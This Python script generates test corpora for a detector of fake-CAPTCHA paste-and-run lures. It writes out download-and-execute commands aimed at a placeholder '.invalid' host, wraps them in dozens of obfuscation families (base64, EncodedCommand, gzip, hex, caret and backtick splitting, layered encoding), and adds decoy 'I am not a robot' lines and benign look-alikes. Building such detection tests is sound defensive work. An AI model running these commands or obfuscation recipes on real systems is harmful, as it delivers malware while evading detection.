#!/usr/bin/env python3
"""Regenerate the stress corpora. Text only: nothing here is ever executed.

  corpus/evasion/encoded.csv    every encoding family wrapped around plain lure commands
  corpus/evasion/multiline.csv  multi-line and padded decoy shapes
  corpus/evasion/boundary.csv   forms that need runtime state; documented as out of scope
  corpus/benign_stress.csv      benign look-alikes: encoded data, terminal output, scripts

Kept apart from corpus/malicious.csv, whose rows are reconstructed from public reporting:
these rows are authored for testing (`fidelity` = derived), so they measure the decoders
and rules but say nothing about field detection. Every payload host is a `.invalid`
placeholder (RFC 2606).
"""
import base64
import csv
import gzip
import os
import zlib

C2 = "c2.invalid"
BU = "browser_unknown"
MAL_HEADER = ["id", "campaign", "actor", "platform", "target", "origin", "text", "fidelity", "source", "notes"]
BEN_HEADER = ["id", "category", "platform", "text", "origin", "target", "role", "bypass_risk", "source_row", "notes"]

WIN = [
    f"iex (iwr 'https://{C2}/p.ps1' -UseBasicParsing)",
    f"irm https://{C2}/a | iex",
    f"(New-Object Net.WebClient).DownloadString('https://{C2}/b') | iex",
    f"iwr https://{C2}/s.exe -OutFile $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe",
]
NIX = [
    f"curl -fsSL https://{C2}/m | bash",
    f"wget -qO- https://{C2}/s.sh | sh",
    f"curl -s -o /tmp/u https://{C2}/u && chmod +x /tmp/u && /tmp/u",
    f"curl -s https://{C2}/p.py | python3 -",
]


def b64(s):
    return base64.b64encode(s.encode()).decode()


def b64u16(s):
    return base64.b64encode(s.encode("utf-16-le")).decode()


def gz(s):
    return base64.b64encode(gzip.compress(s.encode(), mtime=0)).decode()


def deflate(s):
    c = zlib.compressobj(wbits=-15)
    return base64.b64encode(c.compress(s.encode()) + c.flush()).decode()


def b32(s):
    return base64.b32encode(s.encode()).decode()


def hexesc(s):
    return "".join(f"\\x{ord(c):02x}" for c in s)


def octesc(s):
    return "".join(f"\\{ord(c):03o}" for c in s)


def plainhex(s):
    return s.encode().hex()


def codes(s):
    return ",".join(str(ord(c)) for c in s)


def pct(s):
    return "".join(f"%{ord(c):02X}" for c in s)


def split_str(s, q="'"):
    """Literal concatenation, in 6-character pieces."""
    parts = [s[i : i + 6] for i in range(0, len(s), 6)]
    return "+".join(f"{q}{p.replace(q, q + q)}{q}" for p in parts)


def rot13(s):
    return s.translate(
        str.maketrans(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
            "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM",
        )
    )


GZ = "IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('{}')"
DF = "IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{}')"

# family -> function(payload) -> command. "claimed" families have a decoder in the engine;
# "wild" families are seen in reporting and have no decoder, so only wrappers can catch them.
WIN_FAMILIES = {
    "ps_enc_full": lambda p: f"powershell -NoP -W Hidden -EncodedCommand {b64u16(p)}",
    "ps_enc_short": lambda p: f"powershell -ep bypass -enc {b64u16(p)}",
    "ps_enc_e": lambda p: f"pwsh -nop -e {b64u16(p)}",
    "ps_frombase64": lambda p: f"powershell -c \"iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64(p)}')))\"",
    "ps_frombase64_u16": lambda p: f"powershell -w h -c \"iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64u16(p)}')))\"",
    "ps_gzip": lambda p: "powershell -w h -c \"iex(New-Object IO.StreamReader(New-Object " + GZ.format(gz(p)) + ",[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
    "ps_charcode": lambda p: f"powershell -w h -c \"iex (-join [char[]]({codes(p)}))\"",
    "ps_charplus": lambda p: "powershell -c \"iex (" + "+".join(f"[char]{ord(c)}" for c in p) + ")\"",
    "ps_concat_url": lambda p: f"powershell -c \"iex ({split_str(p)})\"",
    "ps_concat_cmd": lambda p: f"powershell -w h -c \"&('i'+'ex') ({split_str(p)})\"",
    "cmd_caret": lambda p: f"c^m^d /c p^o^w^e^r^s^h^e^l^l -w h -c \"{p}\"",
    "cmd_quotes": lambda p: f"c\"m\"d /c pow\"er\"shell -w h -c \"{p}\"",
    "ps_reverse": lambda p: "powershell -w h -c \"$r='" + p[::-1].replace("'", "''") + "';iex(-join $r[-1..-$r.Length])\"",
    "ps_percent": lambda p: f"powershell -w h -c \"iex ([uri]::UnescapeDataString('{pct(p)}'))\"",
    "ps_layered": lambda p: f"powershell -enc {b64u16('iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' + chr(39) + b64(p) + chr(39) + ')))')}",
    # No decoder: only the wrapper can be seen.
    "ps_deflate": lambda p: "powershell -w h -c \"iex(New-Object IO.StreamReader(New-Object " + DF.format(deflate(p)) + ",[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
    "ps_backtick": lambda p: "powershell -c \"" + p.replace("iex", "i`e`x").replace("iwr", "i`w`r").replace("irm", "i`r`m").replace("New-Object", "N`ew-Ob`ject").replace("DownloadString", "Dow`nload`String") + "\"",
    "ps_format": lambda p: "powershell -c \"& ('{1}{0}' -f 'ex','i') ('{0}{1}' -f '" + p[:8].replace("'", "''") + "','" + p[8:].replace("'", "''") + "')\"",
    "ps_hexstr": lambda p: "powershell -c \"iex (-join ('" + plainhex(p) + "' -split '(..)' | ? {$_} | % {[char][convert]::ToInt32($_,16)}))\"",
    "ps_case": lambda p: "PoWeRsHeLl -W hIdDeN -c \"" + p.replace("iex", "iEx").replace("iwr", "IwR").replace("irm", "iRm") + "\"",
}
NIX_FAMILIES = {
    "sh_b64_pipe": lambda p: f"echo \"{b64(p)}\" | base64 -d | bash",
    "sh_b64_decode": lambda p: f"echo {b64(p)} | base64 --decode | sh",
    "sh_b64_mac": lambda p: f"echo {b64(p)} | base64 -D | zsh",
    "sh_b64_herestring": lambda p: f"base64 -d <<< {b64(p)} | bash",
    "sh_b64_subshell": lambda p: f"bash -c \"$(echo {b64(p)} | base64 -d)\"",
    "sh_b64_eval": lambda p: f"eval \"$(echo {b64(p)} | base64 -d)\"",
    "sh_b64_procsub": lambda p: f"bash <(echo {b64(p)} | base64 -d)",
    "sh_b64_python": lambda p: f"echo {b64(p)} | base64 -d | python3",
    "sh_gzip": lambda p: f"echo {gz(p)} | base64 -d | gunzip | bash",
    "sh_hex_printf": lambda p: f"bash -c \"$(printf '{hexesc(p)}')\"",
    "sh_hex_pipe": lambda p: f"printf '{hexesc(p)}' | sh",
    "sh_ansi_c": lambda p: f"bash -c $'{hexesc(p)}'",
    "sh_layered": lambda p: f"echo {b64('echo ' + b64(p) + ' | base64 -d | bash')} | base64 -d | bash",
    "sh_layered3": lambda p: f"echo {b64('echo ' + b64('echo ' + b64(p) + ' | base64 -d | bash') + ' | base64 -d | bash')} | base64 -d | bash",
    # No decoder: only the wrapper can be seen.
    "sh_octal": lambda p: f"printf '{octesc(p)}' | sh",
    "sh_xxd": lambda p: f"echo {plainhex(p)} | xxd -r -p | bash",
    "sh_rev": lambda p: f"echo '{p[::-1]}' | rev | bash",
    "sh_rot13": lambda p: f"echo '{rot13(p)}' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash",
    "sh_base32": lambda p: f"echo {b32(p)} | base32 -d | bash",
    "py_exec_b64": lambda p: f"python3 -c \"import base64,os;os.system(base64.b64decode('{b64(p)}'))\"",
    "osa_shell": lambda p: f"osascript -e 'do shell script \"echo {b64(p)} | base64 -D | bash\"'",
}

L = f"curl -fsSL https://{C2}/m | bash"
D = "# I am not a robot - reCAPTCHA Verification ID: 2165"
MULTILINE = [
    ("inline", f"{L} {D}", True),
    ("inline_tabs", f"{L}\t\t\t\t\t\t\t\tCloud Identificator: 2031 press enter", True),
    ("inline_nbsp", f"{L}{chr(0xA0) * 40}Cloud Identificator: 2031 press enter", True),
    ("next_line", f"{L}\n{D}", True),
    ("next_line_crlf", f"{L}\r\n{D}", True),
    ("next_line_indented", f"{L}\n                  Cloud Identificator: 2031 press enter", True),
    ("blank_lines_1", f"{L}\n\n{D}", True),
    ("blank_lines_5", f"{L}\n\n\n\n\n{D}", True),
    ("blank_lines_40", f"{L}{chr(10) * 40}{D}", True),
    # Script-shaped pastes: today's change narrowed these.
    ("script_then_decoy", f"cd /tmp\n{L}\n{D}", True),
    ("script_then_indented", f"cd /tmp\n{L}\n              Cloud Identificator: 2031 press enter", True),
    ("script_then_3blank", f"cd /tmp\n{L}\n\n\n\n{D}", True),
    ("script_then_1blank", f"cd /tmp\n{L}\n\n{D}", True),
    ("decoy_mid_paste", f"{L}\n{D}\necho done", True),
    ("decoy_two_lines", f"{L}\n# I am not a robot\n# Verification ID: 2165", True),
    ("decoy_first_line", f"{D}\n{L}", False),
]

BOUNDARY = [
    ("var_split", f"a=cur; b=l; $a$b -fsSL https://{C2}/m | bash"),
    ("var_url", f"u=https://{C2}/m; curl -fsSL $u | bash"),
    ("env_substring", "powershell -c \"$e=$env:ComSpec[4,15,25]-join'';& $e 'irm https://" + C2 + "/a|iex'\""),
    ("alias", f"powershell -c \"Set-Alias z iex; z (irm https://{C2}/a)\""),
    ("stdin_stage", f"curl -fsSL https://{C2}/m -o a; sh a"),
    ("lolbin_rename", f"cp /bin/bash /tmp/x; curl -s https://{C2}/m | /tmp/x"),
]

TERM, PS, VSC, FF = "terminal:bash", "terminal:powershell", "application:code", "application:firefox"
B_WIN = "windows"
BENIGN = [
    # (category, platform, text, origin, target, role)
    # --- encoded data that is not code being run
    ("encoded_data", "linux", "kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "echo aGVsbG8gd29ybGQK | base64 -d", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "echo $TOKEN | cut -d. -f2 | base64 -d | jq .", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "base64 -d cert.b64 > cert.pem && openssl x509 -in cert.pem -noout -text", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "echo -n 'user:pass' | base64", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "cat archive.b64 | base64 -d | tar xz -C ./out", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "aws kms decrypt --ciphertext-blob fileb://secret.bin --query Plaintext --output text | base64 -d", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "gh api repos/acme/app/contents/README.md --jq .content | base64 -d", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "curl -s https://api.github.com/repos/acme/app/contents/a.txt | jq -r .content | base64 -d", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "printf '\\x1b[31mred\\x1b[0m\\n'", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "printf '\\xef\\xbb\\xbf' > bom.txt", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "echo 'hello' | xxd -p", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "xxd -r -p dump.hex > firmware.bin", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "python3 -c \"import base64; print(base64.b64decode('aGVsbG8='))\"", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "python3 -c \"import urllib.parse as u; print(u.unquote('a%20b%2Fc'))\"", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "curl 'https://api.example.com/search?q=hello%20world&redirect=https%3A%2F%2Fexample.com%2Fa'", "unknown", TERM, "engineering"),
    ("encoded_data", "linux", "curl -H \"Authorization: Basic $(echo -n \"$U:$P\" | base64)\" https://api.example.com/v1/me", "unknown", TERM, "engineering"),
    ("encoded_data", "any", "https://login.example.com/cb?state=aHR0cHM6Ly9leGFtcGxlLmNvbS9ob21l&code=4%2F0AX4XfWh", FF, "unknown", "standard"),
    ("encoded_data", "any", "SGVsbG8sIHRoaXMgaXMgYSBwbGFpbiBiYXNlNjQgZW5jb2RlZCBzZW50ZW5jZSBhYm91dCBsdW5jaC4=", VSC, "unknown", "engineering"),
    ("encoded_data", "windows", "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('hello'))", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8='))", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "[uri]::UnescapeDataString('a%20b')", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "certutil -encode input.txt output.b64", "unknown", "terminal:cmd", "engineering"),
    ("encoded_data", "windows", "certutil -decode cert.b64 cert.cer", "unknown", "terminal:cmd", "admin"),
    ("encoded_data", "windows", "$s = 'Hello, ' + 'world'; Write-Host $s", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "Write-Host ('=' * 40); $name = 'report' + '-' + (Get-Date -f yyyyMMdd) + '.csv'", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "-join ('a','b','c')", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "'stressed'[-1..-8] -join ''", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "[char]65 + [char]66", "unknown", PS, "engineering"),
    ("encoded_data", "windows", "echo Build ^& test finished ^> done", "unknown", "terminal:cmd", "engineering"),
    ("encoded_data", "windows", "dir C:\\Users\\me\\Documents ^| findstr report", "unknown", "terminal:cmd", "engineering"),
    # --- real-world benign admin tooling that uses these shapes
    ("encoded_admin", "windows", "powershell -NoProfile -Command \"Get-ChildItem Env: | Sort-Object Name\"", "unknown", PS, "admin"),
    ("encoded_admin", "linux", "docker login -u AWS -p $(aws ecr get-login-password) 111122223333.dkr.ecr.us-east-1.amazonaws.com", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "kubectl create secret generic app --from-literal=key=$(openssl rand -base64 32)", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "echo \"$KUBE_CONFIG_B64\" | base64 -d > ~/.kube/config", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "openssl enc -base64 -d -in secret.b64 -out secret.txt", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "ssh-keygen -lf <(echo \"$PUBKEY\" | base64 -d)", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "python3 -m http.server 8000", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "bash ./scripts/test.sh --filter 'auth::verify_token'", "unknown", TERM, "engineering"),
    ("encoded_admin", "linux", "python3 manage.py migrate && python3 manage.py check", "unknown", TERM, "engineering"),
    # --- multi-line terminal output: interpreter named once, the rest is data
    ("terminal_output", "any", "$ aws iam get-role --role-name app\n{\n    \"Role\": {\n        \"Arn\": \"arn:aws:iam::111122223333:role/app-password-recovery-trigger\",\n        \"Description\": \"python3 verification lambda\"\n    }\n}", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "$ aws s3api get-bucket-policy --bucket b\n{\n  \"Resource\": \"arn:aws:s3:::example-artifacts-bucket-prod-us-east-1/python3/*\",\n  \"Sid\": \"VerifyAccess\"\n}", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "$ gcloud run services describe api --format yaml\nspec:\n  template:\n    spec:\n      containers:\n      - image: gcr.io/example/api@sha256:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n        command: [\"python3\"]", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "$ ps aux | grep python\nroot      2211  0.3  1.2 123456 45678 ?  Ss   Nov03   2:11 /usr/bin/python3 -m uvicorn app:api\nme        9921  0.0  0.0   6432   720 pts/1 S+  10:01   0:00 grep python", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "$ journalctl -u app -n 3\nNov 04 10:01:12 host python3[2211]: INFO:     GET /verify?id=8841 200\nNov 04 10:01:13 host python3[2211]: INFO:     authentication confirmed for user\nNov 04 10:01:14 host python3[2211]: INFO:     reference id 8842 accepted", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "$ pytest -q\nFAILED tests/test_auth.py::test_verify - AssertionError: confirm the identifier\n1 failed, 57 passed in 2.41s\npython3 -m pytest exited with code 1", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "bash: line 1: foo: command not found\n\n\n\nPlease confirm the identifier and verify your configuration", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "$ npm test\n> app@1.0.0 test\n> bash scripts/test.sh\n\n\n\nAll checks passed. Verification complete, no human action needed.", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "NAME        TYPE    CLUSTER-IP   PORT(S)\napi         ClusterIP 10.0.0.12  8000/TCP\n\n# python3 service, confirm the identifier in the runbook", "unknown", "unknown", "engineering"),
    ("terminal_output", "any", "Step 3/9 : RUN python3 -m pip install -r requirements.txt\n ---> Running in 3f2a1b9c8d7e\nSuccessfully installed boto3-1.35.2\n ---> 8e7d6c5b4a3f\nRemoving intermediate container 3f2a1b9c8d7e", "unknown", "unknown", "engineering"),
    # --- scripts and docs: an interpreter, comments, and verification words
    ("script_or_doc", "linux", "#!/bin/bash\nset -e\n# Verify the checksum before installing\nsha256sum -c app.sha256\n# Confirm the version\n./app --version", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "python3 -m venv .venv\nsource .venv/bin/activate\n# verify the install and confirm the version\npip --version", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "bash build.sh\n# Verify the build output with the command below", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "python3 app.py\n\n\n\n# press enter to confirm and verify the identifier", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "cd app\nbash ./test.sh\n# confirm tests pass, then verify the human review", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "ruby -v   # confirm the version is at least 3.2", "unknown", TERM, "engineering"),
    ("script_or_doc", "any", "To verify your account, run the installer with python3 and then press enter to confirm.\nYour reference id is 2165.", FF, "unknown", "standard"),
    ("script_or_doc", "any", "def verify(token):\n    # confirm the identifier before activation\n    return subprocess.run(['python3', 'check.py', token])", VSC, "unknown", "engineering"),
    # --- aimed at the decode-to-interpreter rule and the tool-gated decoders
    ("decode_pipe", "linux", "tr -d '\\r' < setup.sh | bash", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "gunzip -c dump.sql.gz | psql app", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "zcat access.log.gz | grep ' 500 ' | wc -l", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "base32 -d key.b32 > key.bin", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "echo JBSWY3DPEHPK3PXP | base32 -d | xxd -p", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "xxd -r -p firmware.hex | sha256sum", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "echo 48656c6c6f2c20776f726c6421 | xxd -r -p", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "printf '\\101\\102\\103\\104\\n'", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "printf '\\033[1;32mOK\\033[0m\\n'", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "git log --oneline | rev | cut -c1-8 | rev", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "cat install.sh | bash", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "echo 'Uryyb, jbeyq' | tr 'a-zA-Z' 'n-za-mN-ZA-M'", "unknown", TERM, "engineering"),
    ("decode_pipe", "linux", "openssl enc -d -aes-256-cbc -pbkdf2 -in backup.tar.enc | tar x", "unknown", TERM, "engineering"),
    ("decode_pipe", "windows", "Write-Host ('{0} items in {1:N2}s' -f $n, $t)", "unknown", PS, "engineering"),
    ("decode_pipe", "windows", "'{0}-{1}.csv' -f 'report','2026' | Out-File names.txt", "unknown", PS, "engineering"),
    ("decode_pipe", "windows", "Start-Process \"powershell\" -ArgumentList '-NoProfile','-File','build.ps1'", "unknown", PS, "engineering"),
    ("decode_pipe", "windows", "set PATH=\"C:\\tools\\bin\";%PATH%", "unknown", "terminal:cmd", "engineering"),
    # --- aimed at strong lure phrases on later lines
    ("script_or_doc", "linux", "curl -fsSL https://sh.rustup.rs | sh\n# press enter to accept the defaults, then verify with rustc -V", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "curl -fsSL https://get.docker.com | sh\n# Verify the installation: docker run hello-world", "unknown", TERM, "engineering"),
    ("script_or_doc", "linux", "python3 crawler.py --respect-robots\n# honours robots.txt; the user agent says it is a robot", "unknown", TERM, "engineering"),
    ("terminal_output", "any", "$ python3 check_captcha.py\n{\n  \"provider\": \"captcha-service\",\n  \"note\": \"not a robot check passed\"\n}", "unknown", "unknown", "engineering"),
    # --- colon-delimited identifiers beside an interpreter
    ("identifier", "any", "python3 run.py urn:uuid:6e8bc430-9c3a-11d9-9669-0800200c9a66 urn:example:tenant:acme-prod-us-east-1:resource:users", "unknown", TERM, "engineering"),
    ("identifier", "any", "bash deploy.sh ghcr.io/example/api-service:2026.11.04-build.1842-9f86d08", "unknown", TERM, "engineering"),
    ("identifier", "any", "python3 tag.py arn:aws:ecs:us-east-1:111122223333:task-definition/example-service-prod-blue:42", "unknown", TERM, "engineering"),
    ("identifier", "any", "python3 sub.py projects/example-prod/subscriptions/billing-events:ack:5f3c9a7e-1b2d-4c6e-8f90-a1b2c3d4e5f6", "unknown", TERM, "engineering"),
    ("identifier", "any", "bash cert.sh AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD", "unknown", TERM, "engineering"),
    ("identifier", "any", "python3 peer.py 2001:0db8:85a3:0000:0000:8a2e:0370:7334 fe80:0000:0000:0000:0202:b3ff:fe1e:8329", "unknown", TERM, "engineering"),
]


def write(path, header, rows):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(header)
        w.writerows(rows)
    print(f"wrote {len(rows)} rows to {path}")


def main():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src = "scripts/build_stress_corpus.py"

    encoded = []
    for families, payloads, plat, target in [
        (WIN_FAMILIES, WIN, "windows", "run_dialog"),
        (NIX_FAMILIES, NIX, "linux", "terminal:bash"),
    ]:
        for fam, enc in families.items():
            for i, p in enumerate(payloads):
                encoded.append([f"E-{fam}-{i}", fam, "test", plat, target, BU, enc(p), "derived", src, ""])
    write(os.path.join(root, "corpus/evasion/encoded.csv"), MAL_HEADER, encoded)

    multi = [[f"L-{n}", n, "test", "linux", "terminal:bash", "unknown", t, "derived", src, "decoy expected" if d else ""]
             for n, t, d in MULTILINE]
    write(os.path.join(root, "corpus/evasion/multiline.csv"), MAL_HEADER, multi)

    boundary = [[f"X-{n}", n, "test", "any", "terminal:bash", BU, t, "derived", src, "needs runtime state"]
                for n, t in BOUNDARY]
    write(os.path.join(root, "corpus/evasion/boundary.csv"), MAL_HEADER, boundary)

    benign = [[f"S{i + 1:03d}", cat, plat, text, origin, target, role, "", "", ""]
              for i, (cat, plat, text, origin, target, role) in enumerate(BENIGN)]
    write(os.path.join(root, "corpus/benign_stress.csv"), BEN_HEADER, benign)


if __name__ == "__main__":
    main()
